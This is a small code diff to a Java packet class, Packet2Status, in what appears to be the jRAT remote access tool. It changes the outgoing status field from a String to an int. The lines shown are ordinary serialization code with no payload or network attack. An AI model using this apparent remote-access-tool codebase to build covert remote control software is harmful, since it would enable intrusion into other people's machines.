@@ -7,15 +7,15 @@ import se.jrat.common.io.StringWriter;
 
 public class Packet2Status extends AbstractOutgoingPacket {
 
-	private String status;
+	private int status;
 
-	public Packet2Status(String status) {
+	public Packet2Status(int status) {
 		this.status = status;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(status);
+		dos.writeInt(status);
 	}
 
 	@Override
